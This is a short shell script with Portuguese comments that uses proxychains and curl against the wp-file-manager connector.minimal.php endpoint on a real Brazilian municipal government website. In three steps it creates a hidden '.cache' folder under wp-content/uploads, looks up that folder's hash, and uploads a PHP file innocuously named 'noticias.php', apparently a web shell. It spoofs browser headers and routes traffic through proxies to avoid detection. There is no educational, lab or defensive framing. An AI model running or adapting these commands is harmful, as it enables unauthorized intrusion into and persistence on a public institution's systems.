# Cria o diretório .cache dentro de /wp-content/uploads/
proxychains4 curl -k -s -X POST \
  "https://osasco.sp.gov.br/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -H "Referer: https://osasco.sp.gov.br/" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -F "cmd=mkdir" \
  -F "target=fl1_L3dwLWNvbnRlbnQvdXBsb2Fkcy8=" \
  -F "name=.cache"

  # Descobrir o hash da pasta criada
  proxychains4 curl -k -s -X POST \
  "https://osasco.sp.gov.br/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -H "Referer: https://osasco.sp.gov.br/" \
  -F "cmd=open" \
  -F "target=fl1_L3dwLWNvbnRlbnQvdXBsb2Fkcy8=" \
  -F "tree=1" | python3 -m json.tool | grep -A3 "cache"

  # Fazer o upload para dentro da pasta oculta
  
  proxychains4 curl -k -s -X POST \
  "https://osasco.sp.gov.br/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -H "Referer: https://osasco.sp.gov.br/" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" \
  -F "cmd=upload" \
  -F "target=fl1_L3dwLWNvbnRlbnQvdXBsb2Fkcy8uY2FjaGU=" \
  -F "upload[]=@/arquivo/noticias.php"
